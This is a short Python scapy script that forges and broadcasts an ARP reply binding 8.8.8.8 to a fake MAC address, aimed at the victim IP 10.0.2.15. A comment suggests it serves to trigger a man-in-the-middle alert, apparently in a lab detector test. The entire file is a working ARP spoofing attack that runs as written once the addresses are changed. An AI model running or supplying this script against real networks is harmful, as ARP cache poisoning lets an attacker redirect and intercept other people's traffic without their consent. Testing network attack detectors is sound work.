from scapy.all import Ether, ARP, sendp

def launch_arp_attack():
    # Construct a Layer 2 ARP Reply packet
    # psrc: The IP being impersonated (e.g., 8.8.8.8)
    # hwsrc: The fake attacker MAC address
    # pdst: The target victim IP (10.0.2.15)
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,  # 2 means ARP Reply (unsolicited reply triggers the MitM alert)
        psrc="8.8.8.8",
        hwsrc="66:66:66:66:66:66",
        pdst="10.0.2.15"
    )

    print("[*] Broadcasting Layer 2 ARP Spoofing attack on enp0s3...")
    sendp(packet, iface="enp0s3", verbose=1)
    print("[+] ARP attack packet transmitted!")

if __name__ == "__main__":
    launch_arp_attack()
